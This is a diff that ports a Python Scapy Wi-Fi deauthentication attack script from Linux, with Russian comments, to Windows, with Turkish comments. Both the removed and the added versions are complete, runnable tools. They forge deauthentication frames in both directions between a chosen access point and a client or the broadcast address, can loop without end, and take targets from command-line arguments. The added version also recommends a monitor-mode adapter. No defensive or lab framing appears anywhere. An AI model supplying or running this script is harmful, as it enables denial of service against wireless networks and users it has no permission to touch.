@@ -1,82 +1,73 @@
-# Скрипт деаутентификационной атаки (Python + Scapy)
-# Требуются права root и сетевой адаптер в режиме монитора
+# Deauthentication Attack Script - Windows Uyumlu
+# Yonetici olarak calistirilmalidir. Npcap kurulu olmali.
 
 import sys
-import os
 import time
 from scapy.all import *
 
-# Проверка прав суперпользователя
-if os.geteuid() != 0:
-    sys.exit("[-] Данный скрипт требует права root. Запустите с sudo.")
-
-# Настройки
-INTERFACE = "wlan0mon"   # Интерфейс в режиме монитора
-TARGET_BSSID = "AA:BB:CC:DD:EE:FF"  # MAC точки доступа (BSSID)
-CLIENT_MAC = "FF:FF:FF:FF:FF:FF"    # MAC клиента или широковещательный для всех
-COUNT = 500             # Количество пакетов (0 = бесконечно)
-REASON_CODE = 7         # Код причины деаутентификации (7 - class 3 frame received from nonassociated STA)
-
-def deauth_attack(interface, ap_mac, client_mac, count, reason):
-    """Отправка деаутентификационных кадров."""
-    # Формирование кадра деаутентификации: subtype 12 (0x0c) = Deauthentication
-    # FCfield: to-DS=0, from-DS=1 (кадр от AP к клиенту)
-    dot11 = Dot11(type=0, subtype=12, addr1=client_mac, addr2=ap_mac, addr3=ap_mac)
-    
-    # Для надежности также отправляем кадры с from-DS=0 (как от клиента к AP)
-    dot11_alt = Dot11(type=0, subtype=12, addr1=ap_mac, addr2=client_mac, addr3=ap_mac)
-    
-    # Фиксированное тело управления (2 байта кода причины)
-    frame_body = Dot11Deauth(reason=reason)
-    
-    # Сборка пакетов
-    pkt_ap_to_client = RadioTap() / dot11 / frame_body
-    pkt_client_to_ap = RadioTap() / dot11_alt / frame_body
-    
-    print(f"[*] Атака запущена: BSSID={ap_mac}, цель={client_mac}, причина={reason}")
-    print(f"[*] Интерфейс: {interface}, пакетов: {count if count > 0 else 'бесконечно'}")
-    
-    sent = 0
+# Windows yonetici yetkisi kontrolu
+import ctypes
+def is_admin():
     try:
-        if count == 0:
-            while True:
-                sendp(pkt_ap_to_client, iface=interface, verbose=0)
-                sendp(pkt_client_to_ap, iface=interface, verbose=0)
-                sent += 2
-                print(f"\r[+] Отправлено: {sent} пакетов", end="", flush=True)
-                time.sleep(0.1)  # 10 пакетов/сек для каждого направления
-        else:
-            for _ in range(count):
-                sendp(pkt_ap_to_client, iface=interface, verbose=0)
-                sendp(pkt_client_to_ap, iface=interface, verbose=0)
-                sent += 2
-                print(f"\r[+] Отправлено: {sent}/{count*2} пакетов", end="", flush=True)
-                time.sleep(0.1)
-    except KeyboardInterrupt:
-        print("\n[!] Атака прервана пользователем.")
-    finally:
-        print(f"\n[*] Итого отправлено: {sent} пакетов.")
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
 
-if __name__ == "__main__":
-    # Парсинг аргументов командной строки (опционально)
-    if len(sys.argv) >= 4:
-        INTERFACE = sys.argv[1]
-        TARGET_BSSID = sys.argv[2]
-        CLIENT_MAC = sys.argv[3]
-        if len(sys.argv) >= 5:
-            COUNT = int(sys.argv[4])
-        if len(sys.argv) >= 6:
-            REASON_CODE = int(sys.argv[5])
-    
-    print(f"=== DEAUTH ATTACK SCRIPT ===")
-    print(f"Интерфейс: {INTERFACE}")
-    print(f"BSSID цели: {TARGET_BSSID}")
-    print(f"MAC клиента: {CLIENT_MAC}")
-    print(f"Количество: {COUNT if COUNT > 0 else 'бесконечный цикл'}")
-    print(f"Код причины: {REASON_CODE}")
-    
-    # Перевод интерфейса в режим монитора, если ещё не переведён
-    os.system(f"iwconfig {INTERFACE} mode monitor 2>/dev/null")
-    time.sleep(1)
-    
-    deauth_attack(INTERFACE, TARGET_BSSID, CLIENT_MAC, COUNT, REASON_CODE)
+if not is_admin():
+    sys.exit("[-] Bu script yonetici olarak calistirilmalidir. Cmd'yi yonetici olarak acin.")
+
+# Kullanim: python deauth.py "Wi-Fi" AA:BB:CC:DD:EE:FF FF:FF:FF:FF:FF:FF 500
+if len(sys.argv) < 4:
+    print("Kullanim: python deauth.py <arayuz> <hedef_bssid> <istemci_mac> [paket_sayisi] [neden_kodu]")
+    print("Ornek: python deauth.py \"Wi-Fi\" AA:BB:CC:DD:EE:FF FF:FF:FF:FF:FF:FF 500")
+    sys.exit(1)
+
+INTERFACE = sys.argv[1]
+TARGET_BSSID = sys.argv[2]
+CLIENT_MAC = sys.argv[3]
+COUNT = int(sys.argv[4]) if len(sys.argv) >= 5 else 0
+REASON_CODE = int(sys.argv[5]) if len(sys.argv) >= 6 else 7
+
+print(f"=== DEAUTH ATTACK SCRIPT (WINDOWS) ===")
+print(f"Arayuz: {INTERFACE}")
+print(f"Hedef BSSID: {TARGET_BSSID}")
+print(f"Istemci MAC: {CLIENT_MAC}")
+print(f"Paket sayisi: {COUNT if COUNT > 0 else 'sonsuz'}")
+print(f"Neden kodu: {REASON_CODE}")
+print(f"[*] Baslatiliyor...")
+
+# Deauth cerceveleri olustur
+# AP'den istemciye
+dot11_ap = Dot11(type=0, subtype=12, addr1=CLIENT_MAC, addr2=TARGET_BSSID, addr3=TARGET_BSSID)
+# Istemciden AP'ye
+dot11_client = Dot11(type=0, subtype=12, addr1=TARGET_BSSID, addr2=CLIENT_MAC, addr3=TARGET_BSSID)
+
+frame_body = Dot11Deauth(reason=REASON_CODE)
+
+pkt_ap = RadioTap() / dot11_ap / frame_body
+pkt_client = RadioTap() / dot11_client / frame_body
+
+sent = 0
+try:
+    if COUNT == 0:
+        while True:
+            sendp(pkt_ap, iface=INTERFACE, verbose=0)
+            sendp(pkt_client, iface=INTERFACE, verbose=0)
+            sent += 2
+            print(f"\r[+] Gonderilen paket: {sent}", end="", flush=True)
+            time.sleep(0.1)
+    else:
+        for _ in range(COUNT):
+            sendp(pkt_ap, iface=INTERFACE, verbose=0)
+            sendp(pkt_client, iface=INTERFACE, verbose=0)
+            sent += 2
+            print(f"\r[+] Gonderilen paket: {sent}/{COUNT*2}", end="", flush=True)
+            time.sleep(0.1)
+except KeyboardInterrupt:
+    print("\n[!] Kullanici tarafindan durduruldu.")
+except OSError as e:
+    print(f"\n[-] Hata: {e}")
+    print("[!] Dahili Wi-Fi adaptoru monitor modu desteklemez. USB Wi-Fi adaptor gerekli.")
+    print("[!] Ornek uyumlu adaptor: Alfa AWUS036ACH")
+finally:
+    print(f"\n[*] Toplam gonderilen paket: {sent}")
